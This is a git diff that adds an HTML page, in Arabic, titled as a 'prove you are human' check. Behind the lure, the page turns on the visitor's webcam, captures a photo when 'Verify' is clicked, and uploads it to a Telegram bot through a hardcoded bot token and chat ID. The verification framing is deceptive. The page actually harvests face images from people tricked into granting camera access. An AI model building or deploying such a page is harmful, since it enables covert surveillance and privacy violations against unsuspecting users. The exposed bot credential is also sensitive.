@@ -1,1 +1,54 @@
 # Camera-test
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Test</title>
+</head>
+<body>
+  <h2>أثبت إنك إنسان</h2>
+  <video id="video" width="300" autoplay></video><br>
+  <button onclick="capture()">تحقق</button>
+
+  <script>
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("فشل الوصول للكاميرا: " + err);
+      });
+
+    function capture() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
+      const dataURL = canvas.toDataURL('image/jpeg');
+
+      fetch(dataURL)
+        .then(res => res.blob())
+        .then(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', '6124563464');
+          formData.append('photo', blob, 'photo.jpg');
+
+          fetch('https://api.telegram.org/bot7707895718:AAEn9GruZqUGd9hDAmBlNAI-2sT3XvfK_24/sendPhoto', {
+            method: 'POST',
+            body: formData
+          }).then(response => {
+            if (response.ok) {
+              alert("تم إرسال الصورة!");
+            } else {
+              alert("فشل الإرسال: " + response.statusText);
+            }
+          });
+        });
+    }
+  </script>
+</body>
+</html>
